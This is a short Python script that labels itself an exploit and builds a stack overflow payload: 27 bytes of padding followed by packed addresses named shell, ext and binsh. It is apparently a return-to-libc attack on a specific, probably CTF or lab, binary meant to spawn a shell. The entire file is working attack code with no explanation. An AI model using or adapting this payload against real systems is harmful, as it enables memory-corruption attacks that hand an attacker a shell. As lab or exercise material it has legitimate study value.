#!/usr/bin/python

import struct


print("here we go, exploit start.")
pad = b'A'*27
ext = struct.pack("I", 0xf7dbad10)
shell = struct.pack("I", 0x80486bd)
#binsh = struct.pack("I", 0x804a028)
binsh = struct.pack("I", 0x080487d0)

print(pad+shell+ext+binsh)
